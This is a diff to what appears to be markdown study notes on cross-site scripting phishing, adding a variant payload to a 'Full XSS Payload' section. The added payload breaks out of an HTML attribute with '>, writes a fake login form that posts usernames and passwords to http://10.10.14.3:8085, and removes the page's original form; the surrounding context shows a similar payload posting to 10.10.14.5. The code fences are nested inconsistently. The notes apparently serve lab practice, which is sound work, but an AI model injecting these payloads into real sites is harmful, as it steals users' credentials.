@@ -56,6 +56,14 @@ document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><in
 #### Full XSS Payload (example)
 ```html
 <script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.5><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
+
+
+##example when inputting payload to delete >' characters
+```c
+'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.3:8085><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
+
+```
+
 ```
 
 ### Step 4: Remove Original Form (Clean Up)
